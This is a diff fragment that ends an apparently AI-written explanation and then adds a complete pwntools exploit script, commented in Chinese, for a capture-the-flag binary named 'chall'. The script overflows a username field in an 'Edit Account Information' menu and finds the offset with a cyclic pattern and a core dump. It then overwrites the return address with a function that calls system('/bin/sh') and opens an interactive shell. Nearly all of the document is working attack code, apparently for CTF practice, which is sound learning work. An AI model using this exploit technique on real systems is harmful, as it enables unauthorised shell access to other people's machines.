@@ -248,3 +248,80 @@ AIMessage(content='To solve this challenge using pwntools, we\'ll exploit a buff
  'By following these steps and using the provided script, you should be able '
  'to exploit the buffer overflow vulnerability and gain a shell on the target '
  'system using pwntools.')
+
+from pwn import *
+
+# 设置pwntools以适应正确的架构
+context.binary = elf = ELF('./chall')  # 替换为实际的二进制文件名
+context.log_level = 'debug'
+
+def start():
+    '''启动针对目标的利用程序。'''
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript='''
+        continue
+        ''')
+    else:
+        return process(elf.path)
+
+def register(p):
+    '''注册账户以访问菜单。'''
+    p.recvuntil('Input your username(max lenth:20): ')
+    p.sendline('user')
+    p.recvuntil('Input your password(max lenth:20): ')
+    p.sendline('pass')
+
+def menu(p, choice):
+    '''导航菜单。'''
+    p.recvuntil('>')
+    p.sendline(str(choice))
+
+def exploit():
+    '''创建并发送利用有效载荷给程序。'''
+    # 启动进程
+    p = start()
+    register(p)
+    menu(p, 2)  # 选择'Edit Account Information'
+
+    # 发送循环模式以找到偏移量
+    pattern = cyclic(200)
+    p.recvuntil('please input new username(max lenth:20): ')
+    p.sendline(pattern)
+    p.recvuntil('please input new password(max lenth:20): ')
+    p.sendline('password')
+
+    # 等待进程崩溃
+    p.wait()
+
+    # 加载核心转储
+    core = Coredump('./core')
+
+    # 找到崩溃发生的偏移量
+    offset = cyclic_find(core.read(core.rsp, 8))
+    log.info(f'Offset found: {offset}')
+
+    # 准备有效载荷
+    shell_addr = elf.symbols['sub_4008A6']
+    log.info(f'Address of sub_4008A6 (system("/bin/sh")): {hex(shell_addr)}')
+
+    payload = flat(
+        b'A' * offset,
+        p64(shell_addr)
+    )
+
+    # 重新启动进程
+    p = start()
+    register(p)
+    menu(p, 2)  # 再次选择'Edit Account Information'
+
+    # 发送利用有效载荷
+    p.recvuntil('please input new username(max lenth:20): ')
+    p.sendline(payload)
+    p.recvuntil('please input new password(max lenth:20): ')
+    p.sendline('password')
+
+    # 与shell交互
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()
